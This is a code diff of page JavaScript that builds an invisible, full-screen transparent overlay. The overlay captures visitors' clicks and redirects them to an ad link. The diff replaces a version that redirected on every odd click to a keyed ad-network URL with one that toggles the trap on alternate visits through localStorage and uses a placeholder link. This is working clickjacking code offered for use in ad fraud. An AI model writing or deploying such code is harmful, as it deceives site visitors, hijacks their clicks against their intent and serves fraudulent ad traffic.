@@ -1,24 +1,34 @@
-// Create a full-page invisible overlay to capture all clicks
-const overlay = document.createElement('div');
-overlay.style.position = 'fixed';
-overlay.style.top = '0';
-overlay.style.left = '0';
-overlay.style.width = '100vw';
-overlay.style.height = '100vh';
-overlay.style.zIndex = '9999';
-overlay.style.cursor = 'pointer';
-overlay.style.background = 'transparent'; // Make sure it's invisible
+document.addEventListener('DOMContentLoaded', () => {
+  let toggle = localStorage.getItem('adToggle');
 
-document.body.appendChild(overlay);
+  // Only show overlay if toggle is 'off' or null
+  if (!toggle || toggle === 'off') {
+    createOverlay();
+  }
 
-overlay.addEventListener('click', () => {
-  let clickCount = localStorage.getItem('adClickCount');
-  clickCount = clickCount ? parseInt(clickCount) : 0;
+  function createOverlay() {
+    const overlay = document.createElement('div');
+    overlay.style.position = 'fixed';
+    overlay.style.top = '0';
+    overlay.style.left = '0';
+    overlay.style.width = '100vw';
+    overlay.style.height = '100vh';
+    overlay.style.zIndex = '9999';
+    overlay.style.cursor = 'pointer';
+    overlay.style.background = 'transparent';
 
-  clickCount++;
-  localStorage.setItem('adClickCount', clickCount);
+    document.body.appendChild(overlay);
 
-  if (clickCount % 2 === 1) {
-    window.location.href = 'https://flirtatiousmoviesbrightly.com/m5u0fm024?key=915f5541df37252209d1ab523c2cc8e5'; // Replace with your link
+    overlay.addEventListener('click', () => {
+      localStorage.setItem('adToggle', 'on');
+      window.location.href = 'https://yourdirectlink.com'; // Replace with your link
+    });
+  }
+
+  // If overlay is not shown, monitor next click to bring it back
+  if (toggle === 'on') {
+    document.addEventListener('click', (e) => {
+      localStorage.setItem('adToggle', 'off');
+    }, { once: true });
   }
 });
